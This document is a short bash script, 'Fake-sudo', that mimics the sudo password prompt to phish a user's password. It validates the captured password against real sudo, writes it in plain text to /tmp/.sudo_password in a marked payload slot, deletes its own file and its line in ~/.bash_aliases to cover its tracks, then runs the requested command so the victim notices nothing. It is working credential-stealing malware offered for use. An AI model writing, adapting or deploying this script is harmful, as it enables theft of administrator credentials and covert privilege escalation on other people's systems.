#!/bin/bash
#
# Fake-sudo
#
# This program imitates the behavior 
# of the "sudo" command.
#

if [ -z "${SUDO_PROMPT}" ]; then
    readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
else
    readonly INPUT_MESSAGE="${SUDO_PROMPT}"
fi

readonly MAXIMUM_ATTEMPTS=3
readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"

attempts() {
    /bin/echo -n "${INPUT_MESSAGE}"
    read -r -s sudo_password
    /bin/echo ""
    if ( /bin/echo "${sudo_password}" | /usr/bin/sudo -S /bin/true > /dev/null 2>&1 ); then
        ##
        # <YOUR-PAYLOAD>
        ##
        /bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
        ##
        # </YOUR-PAYLOAD>
        ##
        /bin/rm ~/.sudo_phishing.sh
        /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
        /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
        /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
        $BASH
        exit 0
    fi
}

if ( (/usr/bin/sudo -n /bin/true > /dev/null 2>&1) || [ "${#}" -eq 0 ] ); then
    /usr/bin/sudo "${@}"
else
    for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
        attempts "${@}"
    done
    /bin/echo "${ERROR_MESSAGE}"
fi